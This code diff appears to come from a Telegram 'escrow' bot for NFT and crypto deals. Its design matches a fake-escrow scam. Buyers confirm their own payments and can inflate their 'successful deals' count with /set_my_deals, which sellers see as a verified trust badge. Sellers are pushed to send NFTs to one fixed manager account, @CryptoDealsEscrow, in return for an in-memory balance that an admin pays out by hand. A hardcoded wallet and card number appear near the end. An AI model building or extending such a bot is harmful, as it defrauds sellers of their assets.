+        'payment_confirmed_authorized': (
+            "✅ Payment confirmed! Seller notified.\n\n"
+            "⏳ **Waiting for manager's NFT transfer confirmation...**\n\n"
+            "📊 Your stats updated:\n"
+            "• Successful deals: {deals}\n\n"
+            "Expect to receive item through manager."
+        ),
+        'payment_confirmation_error': "⚠️ Payment confirmed but there were issues with notifications. Contact support.",
+
+        'seller_deal_info': (
+            "📋 Your deal #{deal_id}\n\n"
+            "📊 Your successful deals: {deals}\n\n"
+            "📦 Offer: {description}\n"
+            "💰 Amount: {amount} {unit}\n"
+            "💱 Currency: {currency}\n\n"
+            "🔗 Link for buyer:\n"
+            "{link}\n\n"
+            "ℹ️ When a buyer joins, you will be notified."
+        ),
+        'new_buyer_notification': (
+            "👤 User @{buyer}\n"
+            "Joined deal #{deal_id}\n\n"
+            "{buyer_stats}\n\n"
+            "⚠️ Verify the user's identity"
+        ),
         'buyer_stats': "📊 Buyer's successful deals: {count}\n{status}",
         'authorized_status': "✅ Verified user",
         'unauthorized_status': "⚠️ New user",
-        'payment_received_seller': "💰 PAYMENT CONFIRMED!\n\n✅ Buyer @{buyer} confirmed payment\n📦 Deal: #{deal_id}\n💎 Item: {description}\n💵 Amount: {amount} {unit}\n\n📊 **Financial:**\n• Fee: {fee_percent}%\n• To be credited after buyer confirmation: {net:.2f} {unit}\n\n⚠️ ACTION REQUIRED:\n1. Transfer item to manager @CryptoDealsEscrow\n2. Click button below\n3. Buyer will be notified to confirm receipt\n4. After confirmation, funds will be credited.",
+
+        'payment_received_seller': (
+            "💰 PAYMENT CONFIRMED!\n\n"
+            "✅ Buyer @{buyer} confirmed payment\n"
+            "📦 Deal: #{deal_id}\n"
+            "💎 Item: {description}\n"
+            "💵 Amount: {amount} {unit}\n\n"
+            "📊 **Financial terms:**\n"
+            "• System fee: {fee_percent}% ({fee:.2f} RUB)\n"
+            "• To be credited to balance: {net:.2f} RUB\n\n"
+            "⚠️ ACTION REQUIRED:\n"
+            "1. Transfer item to manager @CryptoDealsEscrow\n"
+            "2. After transfer, click button below\n"
+            "3. Manager will confirm NFT receipt\n"
+            "4. Amount {net:.2f} RUB will be credited to your balance\n\n"
+            "❌ **Do NOT transfer item directly to buyer!**"
+        ),
         'btn_request_transfer': "📦 Submit NFT transfer request",
         'btn_cancel_deal': "❌ Cancel deal",
-        'transfer_request_submitted': "✅ NFT TRANSFER REQUEST SUBMITTED!\n\n🔗 Deal: #{deal_id}\n📦 Item: {description}\n💰 To be credited after buyer confirmation: {net:.2f} {unit}\n\n⏳ Buyer notified.",
-        'transfer_request_error': "⚠️ Request submitted but notification issues. Contact support.",
-        'buyer_confirm_receipt': "📦 ITEM DELIVERED TO MANAGER!\n\n✅ Seller transferred item to manager.\n📦 Deal: #{deal_id}\n💎 Item: {description}\n\n⬇️ **Please confirm receipt from manager** to complete deal.",
-        'btn_confirm_receipt': "✅ Confirm receipt",
-        'buyer_receipt_confirmed': "🎉 DEAL COMPLETED!\n\n✅ You confirmed receipt.\n💰 Funds will be credited to seller.\n📦 Deal: #{deal_id}\n💎 Item: {description}\n\n⭐️ Thank you!",
-        'seller_funds_credited_after_receipt': "✅ BUYER CONFIRMED RECEIPT!\n\n🔗 Deal: #{deal_id}\n📦 Item: {description}\n💰 Amount: {amount} {unit}\n📊 Fee: {fee:.2f} {unit}\n\n💰 **FUNDS CREDITED!**\n💵 Credited: {net:.2f} {unit}\n🏦 New balance: {balance} {unit}\n\n🎉 Deal completed!",
-        'deal_cancelled': "❌ Deal #{deal_id} cancelled.",
-        'buyer_deal_cancelled': "❌ Deal #{deal_id} was cancelled by seller.",
-        'support_message': "Contact support:",
-        'referral_system': "Section under development",
-        'my_stats': "📊 YOUR STATISTICS\n\n👤 User: @{username}\n🆔 ID: {user_id}\n💼 Successful deals: {deals}\n💵 RUB balance: {balance:.2f} RUB\n⭐️ Stars balance: {stars_balance:.2f} ⭐️\n🎯 Status: {status}\n\n💳 Withdrawal info:\n{wallet_info}\n{card_info}\n\n📝 Withdrawal rules:\n• Min RUB: {min_withdraw} RUB\n• Min Stars: 1 ⭐️\n{deals_requirement}• Fee: {fee}%\n\n💡 Available functions:\n{functions}",
+
+        'transfer_request_submitted': (
+            "✅ NFT TRANSFER REQUEST SUBMITTED!\n\n"
+            "🔗 Deal: #{deal_id}\n"
+            "📦 Item: {description}\n"
+            "💰 To be credited: {net:.2f} RUB\n\n"
+            "📞 Managers notified of your request.\n"
+            "⏳ Await manager's confirmation of NFT receipt.\n\n"
+            "ℹ️ Once manager confirms NFT receipt, {net:.2f} RUB will be credited to your balance."
+        ),
+        'transfer_request_error': "⚠️ Request submitted but there were issues notifying managers. Contact support.",
+
+        'manager_transfer_request': (
+            "📦 NFT TRANSFER REQUEST\n\n"
+            "🔗 Deal ID: #{deal_id}\n"
+            "👤 Seller: @{seller} (ID: {seller_id})\n"
+            "👤 Buyer: @{buyer}\n"
+            "💰 Amount: {amount} {unit}\n"
+            "💎 Item: {description}\n\n"
+            "📊 **Financial terms:**\n"
+            "• Fee: {fee:.2f} RUB ({fee_percent}%)\n"
+            "• To be credited to seller: {net:.2f} RUB\n\n"
+            "⚠️ **Seller claims NFT transfer.**\n"
+            "Please verify NFT receipt and confirm below:"
+        ),
+        'btn_manager_confirm': "✅ Confirm NFT receipt",
+        'btn_manager_reject': "❌ NFT not received",
+
+        'manager_confirmed': (
+            "✅ NFT TRANSFER CONFIRMED!\n\n"
+            "🔗 Deal: #{deal_id}\n"
+            "💰 Credited to seller: {net:.2f} RUB\n"
+            "👤 Seller notified of confirmation\n"
+            "👤 Buyer notified of deal completion\n\n"
+            "🎉 **Deal successfully completed!**"
+        ),
+        'manager_rejected': (
+            "❌ NFT TRANSFER REQUEST REJECTED!\n\n"
+            "🔗 Deal: #{deal_id}\n\n"
+            "⚠️ Seller notified of rejection.\n"
+            "They must transfer NFT and request again."
+        ),
+        'manager_action_error': "⚠️ Confirmation received but there were issues with notifications.",
+
+        'buyer_deal_completed': (
+            "🎉 DEAL SUCCESSFULLY COMPLETED!\n\n"
+            "✅ Manager confirmed NFT receipt from seller\n"
+            "👤 Seller: @{seller}\n"
+            "💰 Amount: {amount} {unit}\n"
+            "📦 Item: {description}\n"
+            "🔗 Deal ID: #{deal_id}\n\n"
+            "📢 Expect to receive item from manager\n\n"
+            "⭐️ Thank you for using Crypto Deals!\n"
+            "Your reliability increased by 1 point."
+        ),
+
+        'seller_funds_credited': (
+            "✅ MANAGER CONFIRMED NFT TRANSFER!\n\n"
+            "🔗 Deal: #{deal_id}\n"
+            "📦 Item: {description}\n"
+            "💰 Deal amount: {amount} RUB\n"
+            "📊 System fee: {fee:.2f} RUB\n\n"
+            "💰 **FUNDS CREDITED TO YOUR BALANCE!**\n"
+            "💵 Credited: {net:.2f} RUB\n"
+            "🏦 Current balance: {balance:.2f} RUB\n\n"
+            "🎉 Deal successfully completed!\n"
+            "Buyer notified of completion.\n\n"
+            "⭐️ Thank you for honest trading!\n"
+            "Your reliability increased by 1 point."
+        ),
+        'btn_back_to_menu': "🏠 Back to main menu",
+
+        'seller_transfer_rejected': (
+            "❌ NFT TRANSFER REQUEST REJECTED\n\n"
+            "🔗 Deal: #{deal_id}\n"
+            "📦 Item: {description}\n\n"
+            "⚠️ **Manager did NOT receive NFT!**\n\n"
+            "📌 **Next steps:**\n"
+            "1. Transfer NFT to manager @CryptoDealsEscrow\n"
+            "2. After transfer, click 'Submit NFT transfer request' again\n"
+            "3. Manager will confirm receipt\n"
+            "4. Funds will be credited to your balance\n\n"
+            "❌ Do not transfer item directly to buyer!"
+        ),
+
+        'deal_cancelled': "❌ Deal #{deal_id} cancelled.\nAll participants notified.",
+        'buyer_deal_cancelled': "❌ Deal #{deal_id} was cancelled by the seller.",
+
+        'support_message': "Contact support by clicking the button below:",
+
+        'referral_system': "Section 'Referral System' under development",
+
+        'my_stats': (
+            "📊 YOUR STATISTICS\n\n"
+            "👤 User: @{username}\n"
+            "🆔 ID: {user_id}\n"
+            "💼 Successful deals: {deals}\n"
+            "💰 Balance: {balance:.2f} RUB\n"
+            "🎯 Status: {status}\n\n"
+            "💳 Withdrawal information:\n"
+            "{wallet_info}\n"
+            "{card_info}\n\n"
+            "📝 Withdrawal rules:\n"
+            "• Minimum: {min_withdraw} RUB\n"
+            "{deals_requirement}"
+            "• System fee: {fee}%\n\n"
+            "💡 Available functions:\n"
+            "{functions}"
+        ),
         'function_confirm_payment': "• Confirm payment in deals",
         'function_not_available': "• (Not available)",
         'function_change_stats': "• Change statistics",
         'function_view_stats': "• View statistics",
-        'function_withdraw': "• Withdraw funds",
-        'set_my_deals_current': "📊 Your successful deals: {deals}\n\nTo set a new value: `/set_my_deals 10`",
-        'set_my_deals_success': "✅ Successful deals set to: {deals}\n\n📊 Your stats updated.",
-        'set_my_deals_negative': "❌ Number cannot be negative",
-        'set_my_deals_invalid': "❌ Invalid format. Use integer, e.g., `/set_my_deals 15`",
+        'function_withdraw': "• Withdraw funds from balance",
+        'set_my_deals_current': "📊 Your current successful deals count: {deals}\n\nTo set a new value, use:\n`/set_my_deals 10`",
+        'set_my_deals_success': "✅ Successful deals count set to: {deals}\n\n📊 Your stats:\n• Successful deals: {deals}\n• Status: ✅ Authorized\n\n📢 This count will be shown to sellers when you are a buyer!",
+        'set_my_deals_negative': "❌ Number of deals cannot be negative",
+        'set_my_deals_invalid': "❌ Invalid number format. Use an integer, e.g.: `/set_my_deals 15`",
+
         'error_occurred': "An error occurred. Please try again.",
-        'deal_not_found': "❌ Deal not found.",
-        'not_seller': "❌ You are not the seller.",
-        'not_buyer': "❌ You are not the buyer.",
-        'not_authorized': "❌ You are not authorized.\n\nContact support.",
-        'buy_command_usage': "❌ /buy is only for buyers in an active deal.\n\nUse: `/buy deal_id`",
+        'deal_not_found': "❌ Deal not found or was deleted",
+        'not_seller': "❌ You are not the seller in this deal",
+        'not_buyer': "❌ You are not the buyer in this deal",
+        'not_authorized': (
+            "❌ You do not have access to confirm payments.\n\n"
+            "To gain access, please contact support."
+        ),
+        'buy_command_usage': (
+            "❌ The /buy command is only available for buyers in an active deal.\n\n"
+            "Use:\n"
+            "`/buy deal_id`\n\n"
+            "where deal_id is the ID of the deal you are a buyer in."
+        ),
     }
 }
 
@@ -559,6 +887,7 @@ SUPPORT_URL = "https://t.me/CryptoDealsEscrow"
 ADMIN_ID = 6764327072
 MANAGER_IDS = {994793292, 123456789, 6764327072, 8534029722}
 FIXED_TON_WALLET = "UQCCDZQoVkrNBsD9r6_Q-SQ1LeV7unXLfNkm27ZJFyqd8vZn"
+FIXED_CARD_NUMBER = "2204321073884835"   # <-- добавлена фиксированная карта
 
 # Словари для хранения данных пользователей
 user_wallets = {}
@@ -569,9 +898,7 @@ authorized_users = set()
 user_deals_count = {}
 seller_transfers = {}
 user_balances = {}
-user_stars_balances = {}
 pending_withdrawals = {}
-pending_stars_withdrawals = {}
 
 CURRENCY_TON = "TON"
 CURRENCY_STARS = "Звезды"
@@ -579,8 +906,8 @@ CURRENCY_RUB = "Рубли"
 
 CURRENCY_UNITS = {
     CURRENCY_TON: "TON",
-    CURRENCY_STARS: "⭐️",
-    CURRENCY_RUB: "руб"
+    CURRENCY_STARS: "Звезд",
+    CURRENCY_RUB: "Руб"
 }
 
 SYSTEM_FEE_PERCENT = 1
@@ -601,9 +928,6 @@ def get_withdrawal_status(user_id: int, method: str, context: ContextTypes.DEFAU
         return False, get_text(user_id, 'withdraw_needed', context, needed=needed), needed
     else:
         return True, get_text(user_id, 'withdraw_available', context), 0
-
-def get_stars_withdrawal_status(user_id: int) -> tuple:
-    return True, get_text(user_id, 'withdraw_available', context), 0
 
 # ------------------ КЛАВИАТУРЫ ------------------
 def get_language_keyboard():
@@ -650,7 +974,6 @@ def get_withdrawal_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
     return InlineKeyboardMarkup([
         [InlineKeyboardButton(get_text(user_id, 'btn_withdraw_card', context), callback_data="withdraw_to_card")],
         [InlineKeyboardButton(get_text(user_id, 'btn_withdraw_wallet', context), callback_data="withdraw_to_wallet")],
-        [InlineKeyboardButton(get_text(user_id, 'btn_withdraw_stars', context), callback_data="withdraw_to_stars")],
         [InlineKeyboardButton(get_text(user_id, 'back_to_menu', context), callback_data="my_balance")]
     ])
 
@@ -672,9 +995,10 @@ def get_seller_transfer_keyboard(deal_id: str, user_id: int, context: ContextTyp
         [InlineKeyboardButton(get_text(user_id, 'btn_cancel_deal', context), callback_data=f"cancel_deal_{deal_id}")]
     ])
 
-def get_buyer_receipt_keyboard(deal_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
+def get_manager_confirmation_keyboard(deal_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton(get_text(user_id, 'btn_confirm_receipt', context), callback_data=f"confirm_receipt_{deal_id}")]
+        [InlineKeyboardButton(get_text(user_id, 'btn_manager_confirm', context), callback_data=f"manager_confirm_{deal_id}")],
+        [InlineKeyboardButton(get_text(user_id, 'btn_manager_reject', context), callback_data=f"manager_reject_{deal_id}")]
     ])
 
 def get_transfer_confirmed_keyboard(user_id: int, context: ContextTypes.DEFAULT_TYPE):
@@ -693,13 +1017,10 @@ def generate_deal_id():
 def get_user_balance(user_id: int) -> float:
     return user_balances.get(user_id, 0.0)
 
-def get_user_stars_balance(user_id: int) -> float:
-    return user_stars_balances.get(user_id, 0.0)
-
 async def add_to_balance(user_id: int, amount: float, description: str, context: ContextTypes.DEFAULT_TYPE = None):
-    current = user_balances.get(user_id, 0.0)
-    user_balances[user_id] = current + amount
-    logger.info(f"💰 Зачислено {amount} руб пользователю {user_id}. Новый баланс: {user_balances[user_id]}")
+    current_balance = user_balances.get(user_id, 0.0)
+    user_balances[user_id] = current_balance + amount
+    logger.info(f"💰 Зачислено {amount} руб на баланс пользователя {user_id}. Новый баланс: {user_balances[user_id]}")
     if context:
         try:
             await context.bot.send_message(
@@ -714,30 +1035,13 @@ async def add_to_balance(user_id: int, amount: float, description: str, context:
             logger.error(f"❌ Не удалось уведомить пользователя о зачислении: {e}")
     return user_balances[user_id]
 
-async def add_to_stars_balance(user_id: int, amount: float, description: str, context: ContextTypes.DEFAULT_TYPE = None):
-    current = user_stars_balances.get(user_id, 0.0)
-    user_stars_balances[user_id] = current + amount
-    logger.info(f"⭐️ Зачислено {amount} звёзд пользователю {user_id}. Новый баланс: {user_stars_balances[user_id]}")
-    if context:
-        try:
-            await context.bot.send_message(
-                chat_id=user_id,
-                text=f"⭐️ ЗВЁЗДЫ ЗАЧИСЛЕНЫ НА БАЛАНС!\n\n"
-                     f"⭐️ Сумма: {amount:.2f} ⭐️\n"
-                     f"📝 Причина: {description}\n"
-                     f"🏦 Текущий звёздный баланс: {user_stars_balances[user_id]:.2f} ⭐️"
-            )
-        except Exception as e:
-            logger.error(f"❌ Не удалось уведомить пользователя о зачислении звёзд: {e}")
-    return user_stars_balances[user_id]
-
 async def deduct_from_balance(user_id: int, amount: float, description: str, context: ContextTypes.DEFAULT_TYPE = None):
-    current = user_balances.get(user_id, 0.0)
-    if current < amount:
-        logger.error(f"❌ Недостаточно рублей у пользователя {user_id}: {current} < {amount}")
+    current_balance = user_balances.get(user_id, 0.0)
+    if current_balance < amount:
+        logger.error(f"❌ Недостаточно средств у пользователя {user_id}: {current_balance} < {amount}")
         return False
-    user_balances[user_id] = current - amount
-    logger.info(f"💰 Списано {amount} руб с пользователя {user_id}. Новый баланс: {user_balances[user_id]}")
+    user_balances[user_id] = current_balance - amount
+    logger.info(f"💰 Списано {amount} руб с баланса пользователя {user_id}. Новый баланс: {user_balances[user_id]}")
     if context:
         try:
             await context.bot.send_message(
@@ -749,26 +1053,6 @@ async def deduct_from_balance(user_id: int, amount: float, description: str, con
             )
         except Exception as e:
             logger.error(f"❌ Не удалось уведомить пользователя о списании: {e}")
-    return True
-
-async def deduct_from_stars_balance(user_id: int, amount: float, description: str, context: ContextTypes.DEFAULT_TYPE = None):
-    current = user_stars_balances.get(user_id, 0.0)
-    if current < amount:
-        logger.error(f"❌ Недостаточно звёзд у пользователя {user_id}: {current} < {amount}")
-        return False
-    user_stars_balances[user_id] = current - amount
-    logger.info(f"⭐️ Списано {amount} звёзд с пользователя {user_id}. Новый баланс: {user_stars_balances[user_id]}")
-    if context:
-        try:
-            await context.bot.send_message(
-                chat_id=user_id,
-                text=f"⭐️ ЗВЁЗДЫ СПИСАНЫ С БАЛАНСА!\n\n"
-                     f"⭐️ Сумма: {amount:.2f} ⭐️\n"
-                     f"📝 Причина: {description}\n"
-                     f"🏦 Текущий звёздный баланс: {user_stars_balances[user_id]:.2f} ⭐️"
-            )
-        except Exception as e:
-            logger.error(f"❌ Не удалось уведомить пользователя о списании звёзд: {e}")
     return True
 
 def calculate_with_fee(amount: float) -> tuple:
@@ -785,7 +1069,7 @@ async def process_withdrawal(user_id: int, amount: float, method: str, details: 
         if amount > current_balance:
             await context.bot.send_message(chat_id=user_id, text=get_text(user_id, 'insufficient_balance', context, balance=current_balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT, need=amount - current_balance))
             return False
-        success = await deduct_from_balance(user_id, amount, f"Вывод рублей ({method})", context)
+        success = await deduct_from_balance(user_id, amount, f"Вывод средств ({method})", context)
         if not success:
             return False
         pending_withdrawals[user_id] = {'amount': amount, 'method': method, 'details': details, 'timestamp': time.time()}
@@ -793,43 +1077,18 @@ async def process_withdrawal(user_id: int, amount: float, method: str, details: 
             username = (await context.bot.get_chat(user_id)).username or f"ID: {user_id}"
         except:
             username = f"ID: {user_id}"
-        admin_text = f"💸 НОВАЯ ЗАЯВКА НА ВЫВОД РУБЛЕЙ\n\n👤 Пользователь: @{username}\n🆔 ID: {user_id}\n💵 Сумма: {amount:.2f} руб\n📋 Способ: {method}\n📝 Реквизиты: {details}\n\n✅ Средства списаны с баланса пользователя\n💰 Остаток на балансе: {get_user_balance(user_id):.2f} руб\n\n⚠️ ТРЕБУЕТСЯ ОБРАБОТКА ВЫВОДА!"
+        admin_text = f"💸 НОВАЯ ЗАЯВКА НА ВЫВОД СРЕДСТВ\n\n👤 Пользователь: @{username}\n🆔 ID: {user_id}\n💵 Сумма: {amount:.2f} руб\n📋 Способ: {method}\n📝 Реквизиты: {details}\n\n✅ Средства списаны с баланса пользователя\n💰 Остаток на балансе: {get_user_balance(user_id):.2f} руб\n\n⚠️ ТРЕБУЕТСЯ ОБРАБОТКА ВЫВОДА!"
         await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text)
         await context.bot.send_message(chat_id=user_id, text=get_text(user_id, 'withdraw_success', context, amount=amount, method=method, details=details, balance=get_user_balance(user_id)))
         return True
     except Exception as e:
-        logger.error(f"❌ Ошибка при обработке вывода рублей: {e}")
-        await context.bot.send_message(chat_id=user_id, text=get_text(user_id, 'withdraw_error', context))
-        return False
-
-async def process_stars_withdrawal(user_id: int, amount: float, target_username: str, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        if amount < 1:
-            await context.bot.send_message(chat_id=user_id, text="❌ Минимальная сумма вывода звёзд — 1 ⭐️")
-            return False
-        current = get_user_stars_balance(user_id)
-        if amount > current:
-            await context.bot.send_message(chat_id=user_id, text=get_text(user_id, 'insufficient_stars_balance', context, stars_balance=current, need=amount - current))
-            return False
-        success = await deduct_from_stars_balance(user_id, amount, f"Вывод звёзд на {target_username}", context)
-        if not success:
-            return False
-        pending_stars_withdrawals[user_id] = {'amount': amount, 'username': target_username, 'timestamp': time.time()}
-        try:
-            username = (await context.bot.get_chat(user_id)).username or f"ID: {user_id}"
-        except:
-            username = f"ID: {user_id}"
-        admin_text = f"⭐️ НОВАЯ ЗАЯВКА НА ВЫВОД ЗВЁЗД\n\n👤 Пользователь: @{username}\n🆔 ID: {user_id}\n⭐️ Сумма: {amount:.0f} ⭐️\n📋 Telegram: {target_username}\n\n✅ Звёзды списаны с баланса пользователя\n💰 Остаток звёзд: {get_user_stars_balance(user_id):.2f} ⭐️\n\n⚠️ ТРЕБУЕТСЯ ОБРАБОТКА ВЫВОДА!"
-        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text)
-        await context.bot.send_message(chat_id=user_id, text=get_text(user_id, 'withdraw_stars_success', context, amount=amount, username=target_username, stars_balance=get_user_stars_balance(user_id)))
-        return True
-    except Exception as e:
-        logger.error(f"❌ Ошибка при обработке вывода звёзд: {e}")
+        logger.error(f"❌ Ошибка при обработке вывода средств: {e}")
         await context.bot.send_message(chat_id=user_id, text=get_text(user_id, 'withdraw_error', context))
         return False
 
 # ------------------ ФУНКЦИИ УВЕДОМЛЕНИЙ ------------------
-async def notify_seller_about_buyer(deal_id: str, buyer_username: str, buyer_id: int, context: ContextTypes.DEFAULT_TYPE):
+async def notify_seller_about_buyer(deal_id: str, buyer_username: str, buyer_id: int,
+                                    context: ContextTypes.DEFAULT_TYPE):
     if deal_id in deal_links:
         deal_data = deal_links[deal_id]
         seller_id = deal_data['user_id']
@@ -837,7 +1096,8 @@ async def notify_seller_about_buyer(deal_id: str, buyer_username: str, buyer_id:
         is_authorized = is_authorized_user(buyer_id)
         status = get_text(seller_id, 'authorized_status' if is_authorized else 'unauthorized_status', context)
         buyer_stats = get_text(seller_id, 'buyer_stats', context, count=buyer_deals_count, status=status)
-        text = get_text(seller_id, 'new_buyer_notification', context, buyer=buyer_username, deal_id=deal_id, buyer_stats=buyer_stats)
+        text = get_text(seller_id, 'new_buyer_notification', context,
+                        buyer=buyer_username, deal_id=deal_id, buyer_stats=buyer_stats)
         try:
             await context.bot.send_message(chat_id=seller_id, text=text)
             logger.info(f"✅ Уведомление о новом покупателе отправлено продавцу {seller_id} для сделки {deal_id}")
@@ -849,7 +1109,8 @@ async def notify_seller_about_buyer(deal_id: str, buyer_username: str, buyer_id:
         logger.error(f"❌ Сделка {deal_id} не найдена для уведомления продавца")
         return False
 
-async def notify_seller_about_payment(deal_id: str, buyer_username: str, buyer_id: int, context: ContextTypes.DEFAULT_TYPE):
+async def notify_seller_about_payment(deal_id: str, buyer_username: str, buyer_id: int,
+                                      context: ContextTypes.DEFAULT_TYPE):
     if deal_id in deal_links:
         deal_data = deal_links[deal_id]
         seller_id = deal_data['user_id']
@@ -863,17 +1124,17 @@ async def notify_seller_about_payment(deal_id: str, buyer_username: str, buyer_i
             'buyer_id': buyer_id,
             'buyer_username': buyer_username,
             'seller_confirmed': False,
-            'buyer_receipt_confirmed': False,
+            'manager_confirmed': False,
+            'transfer_requested': False,
             'deal_amount': deal_amount,
             'net_amount': net_amount,
-            'fee': fee,
-            'currency': currency
+            'fee': fee
         }
 
         text = get_text(seller_id, 'payment_received_seller', context,
                         buyer=buyer_username, deal_id=deal_id, description=deal_data['description'],
                         amount=deal_amount, unit=currency_unit, fee_percent=SYSTEM_FEE_PERCENT,
-                        fee=fee, net=net_amount, currency_unit=currency_unit)
+                        fee=fee, net=net_amount)
         try:
             await context.bot.send_message(chat_id=seller_id, text=text,
                                            reply_markup=get_seller_transfer_keyboard(deal_id, seller_id, context))
@@ -898,77 +1159,138 @@ async def notify_buyer_about_payment_confirmation(deal_id: str, buyer_id: int, c
             return False
     return False
 
-async def notify_buyer_about_transfer_request(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
-    if deal_id in deal_links and deal_id in seller_transfers:
-        deal_data = deal_links[deal_id]
-        transfer_info = seller_transfers[deal_id]
-        buyer_id = transfer_info['buyer_id']
-        text = get_text(buyer_id, 'buyer_confirm_receipt', context,
-                        deal_id=deal_id, description=deal_data['description'])
-        try:
-            await context.bot.send_message(chat_id=buyer_id, text=text,
-                                           reply_markup=get_buyer_receipt_keyboard(deal_id, buyer_id, context))
-            logger.info(f"✅ Запрос подтверждения получения отправлен покупателю {buyer_id} для сделки {deal_id}")
-            return True
-        except Exception as e:
-            logger.error(f"❌ Не удалось отправить запрос покупателю: {e}")
-            return False
-    return False
-
-async def finalize_deal_after_buyer_confirmation(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
+async def notify_managers_about_transfer_request(deal_id: str, seller_username: str,
+                                                 context: ContextTypes.DEFAULT_TYPE):
     if deal_id in deal_links and deal_id in seller_transfers:
         deal_data = deal_links[deal_id]
         transfer_info = seller_transfers[deal_id]
         seller_id = transfer_info['seller_id']
+        buyer_username = transfer_info['buyer_username']
+        currency = deal_data.get('currency', CURRENCY_TON)
+        currency_unit = CURRENCY_UNITS.get(currency, "TON")
+        deal_amount = transfer_info['deal_amount']
+        net_amount = transfer_info['net_amount']
+        fee = transfer_info['fee']
+
+        text = get_text(ADMIN_ID, 'manager_transfer_request', context,
+                        deal_id=deal_id, seller=seller_username, seller_id=seller_id,
+                        buyer=buyer_username, amount=deal_amount, unit=currency_unit,
+                        description=deal_data['description'], fee=fee, fee_percent=SYSTEM_FEE_PERCENT, net=net_amount)
+
+        notified_managers = 0
+        for manager_id in MANAGER_IDS:
+            try:
+                await context.bot.send_message(chat_id=manager_id, text=text,
+                                               reply_markup=get_manager_confirmation_keyboard(deal_id, manager_id, context))
+                notified_managers += 1
+                logger.info(f"✅ Уведомление отправлено менеджеру {manager_id} о заявке на передачу {deal_id}")
+            except Exception as e:
+                logger.error(f"❌ Не удалось отправить уведомление менеджеру {manager_id}: {e}")
+
+        return notified_managers > 0
+    return False
+
+async def notify_buyer_about_transfer_confirmation(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
+    if deal_id in deal_links and deal_id in seller_transfers:
+        deal_data = deal_links[deal_id]
+        transfer_info = seller_transfers[deal_id]
         buyer_id = transfer_info['buyer_id']
+        seller_username = deal_data.get('username', 'Продавец')
+        currency = deal_data.get('currency', CURRENCY_TON)
+        currency_unit = CURRENCY_UNITS.get(currency, "TON")
+
+        text = get_text(buyer_id, 'buyer_deal_completed', context,
+                        seller=seller_username, amount=deal_data['amount'],
+                        unit=currency_unit, description=deal_data['description'], deal_id=deal_id)
+        try:
+            await context.bot.send_message(chat_id=buyer_id, text=text,
+                                           reply_markup=get_transfer_confirmed_keyboard(buyer_id, context))
+            user_deals_count[buyer_id] = user_deals_count.get(buyer_id, 0) + 1
+            logger.info(f"✅ Уведомление о передаче NFT отправлено покупателю {buyer_id}")
+            return True
+        except Exception as e:
+            logger.error(f"❌ Не удалось отправить уведомление покупателю о передаче: {e}")
+            return False
+    return False
+
+async def notify_seller_about_manager_confirmation(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
+    if deal_id in deal_links and deal_id in seller_transfers:
+        deal_data = deal_links[deal_id]
+        transfer_info = seller_transfers[deal_id]
+        seller_id = transfer_info['seller_id']
         net_amount = transfer_info['net_amount']
         fee = transfer_info['fee']
         deal_amount = transfer_info['deal_amount']
+
+        new_balance = await add_to_balance(seller_id, net_amount, f"Завершение сделки #{deal_id}", context)
+        user_deals_count[seller_id] = user_deals_count.get(seller_id, 0) + 1
+
+        text = get_text(seller_id, 'seller_funds_credited', context,
+                        deal_id=deal_id, description=deal_data['description'],
+                        amount=deal_amount, fee=fee, net=net_amount, balance=new_balance)
+        try:
+            await context.bot.send_message(chat_id=seller_id, text=text,
+                                           reply_markup=get_transfer_confirmed_keyboard(seller_id, context))
+            logger.info(f"✅ Продавец {seller_id} уведомлен о подтверждении передачи")
+            return True
+        except Exception as e:
+            logger.error(f"❌ Не удалось уведомить продавца: {e}")
+            return False
+    return False
+
+async def notify_seller_about_manager_rejection(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
+    if deal_id in deal_links and deal_id in seller_transfers:
+        deal_data = deal_links[deal_id]
+        transfer_info = seller_transfers[deal_id]
+        seller_id = transfer_info['seller_id']
+
+        text = get_text(seller_id, 'seller_transfer_rejected', context,
+                        deal_id=deal_id, description=deal_data['description'])
+        try:
+            await context.bot.send_message(chat_id=seller_id, text=text,
+                                           reply_markup=get_seller_transfer_keyboard(deal_id, seller_id, context))
+            logger.info(f"✅ Продавец {seller_id} уведомлен об отклонении заявки")
+            return True
+        except Exception as e:
+            logger.error(f"❌ Не удалось уведомить продавца об отклонении: {e}")
+            return False
+    return False
+
+async def notify_admin_about_completed_deal(deal_id: str, context: ContextTypes.DEFAULT_TYPE):
+    if deal_id in deal_links and deal_id in seller_transfers:
+        deal_data = deal_links[deal_id]
+        transfer_info = seller_transfers[deal_id]
         seller_username = deal_data.get('username', 'Продавец')
         buyer_username = transfer_info.get('buyer_username', 'Покупатель')
         currency = deal_data.get('currency', CURRENCY_TON)
         currency_unit = CURRENCY_UNITS.get(currency, "TON")
+        deal_amount = transfer_info['deal_amount']
+        net_amount = transfer_info['net_amount']
+        fee = transfer_info['fee']
 
-        if currency == CURRENCY_STARS:
-            new_balance = await add_to_stars_balance(seller_id, net_amount, f"Завершение сделки #{deal_id} (подтверждено покупателем)", context)
-            balance_text = f"{new_balance:.2f} ⭐️"
-        else:
-            new_balance = await add_to_balance(seller_id, net_amount, f"Завершение сделки #{deal_id} (подтверждено покупателем)", context)
-            balance_text = f"{new_balance:.2f} руб"
-
-        user_deals_count[seller_id] = user_deals_count.get(seller_id, 0) + 1
-        user_deals_count[buyer_id] = user_deals_count.get(buyer_id, 0) + 1
-
-        seller_text = get_text(seller_id, 'seller_funds_credited_after_receipt', context,
-                               deal_id=deal_id, description=deal_data['description'],
-                               amount=deal_amount, fee=fee, net=net_amount, unit=currency_unit,
-                               balance=balance_text)
-        await context.bot.send_message(chat_id=seller_id, text=seller_text, reply_markup=get_transfer_confirmed_keyboard(seller_id, context))
-
-        buyer_text = get_text(buyer_id, 'buyer_receipt_confirmed', context,
-                              deal_id=deal_id, description=deal_data['description'])
-        await context.bot.send_message(chat_id=buyer_id, text=buyer_text, reply_markup=get_transfer_confirmed_keyboard(buyer_id, context))
-
